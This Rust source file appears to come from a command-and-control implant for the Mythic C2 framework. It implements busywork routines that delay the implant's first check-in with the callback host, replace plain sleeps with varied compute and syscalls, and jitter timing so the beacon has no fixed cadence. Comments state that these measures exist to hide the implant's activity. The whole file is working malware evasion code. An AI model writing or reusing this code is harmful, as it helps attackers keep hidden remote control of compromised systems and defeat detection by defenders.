use std::hint::black_box;
use std::time::Duration;
use crate::config;
use busywork::{BusyWork, Categories, Intensity, FeedWork};

/// Parsed busywork level. `"off"` / `"none"` skips computational work entirely.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Level {
    Off,
    Low,
    Medium,
    High,
    Ultra,
}

fn level() -> Level {
    match config::busywork_intensity {
        "off" | "none" | "disabled" => Level::Off,
        "low" => Level::Low,
        "high" => Level::High,
        "ultra" => Level::Ultra,
        // "medium" and any unknown value default to Medium
        _ => Level::Medium,
    }
}

fn to_intensity(l: Level) -> Option<Intensity> {
    match l {
        Level::Off => None,
        Level::Low => Some(Intensity::Low),
        Level::Medium => Some(Intensity::Medium),
        Level::High => Some(Intensity::High),
        Level::Ultra => Some(Intensity::Ultra),
    }
}

fn jitter_ms(lo: u64, hi: u64) -> u64 {
    debug_assert!(hi >= lo);
    let mut buf = [0u8; 8];
    let _ = getrandom::getrandom(&mut buf);
    let v = u64::from_le_bytes(buf);
    lo + (v % (hi - lo + 1))
}

/// Startup delay before first C2 contact.
///
/// Single burst at the configured intensity (not 3×). Ultra/High builds
/// intentionally wait longer before the first check-in; off skips work.
pub fn startup_delay() {
    let Some(i) = to_intensity(level()) else {
        return;
    };
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .feed(config::user_agent)
            .run(),
    );
}

/// Sleep replacement between tasking rounds.
///
/// One BusyWork burst at the **configured** intensity provides the main
/// callback-interval work (varied syscalls / compute — not a fixed sleep).
/// A short jittered yield follows so we are not a pure spin loop and so the
/// tasking loop stays responsive under Medium/High.
///
/// Previously this ran three full-intensity bursts, which made Medium look
/// "stuck in submitted" for minutes while Mythic already had tasks queued.
pub fn idle() {
    let l = level();
    let Some(i) = to_intensity(l) else {
        // off: jittered sleep only — avoids a fixed 200ms beacon cadence
        std::thread::sleep(Duration::from_millis(jitter_ms(80, 280)));
        return;
    };

    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .feed(config::user_agent)
            .run(),
    );

    // Small yield only — not a second full intensity tax.
    std::thread::sleep(Duration::from_millis(jitter_ms(20, 120)));
}

/// Lightweight ambient noise around real work (crypto, file ops, command start).
///
/// Always **Low** and restricted to COMPUTE|MEMORY so hot paths (many calls
/// per task) cannot re-introduce multi-second stalls. Full intensity belongs
/// in `idle()` / `startup_delay()` only.
///
/// No-op when busywork is `off`.
pub fn churn(data: &(impl FeedWork + ?Sized)) {
    if level() == Level::Off {
        return;
    }
    black_box(
        BusyWork::new(Intensity::Low)
            .allow(Categories::COMPUTE | Categories::MEMORY)
            .feed(data)
            .run(),
    );
}
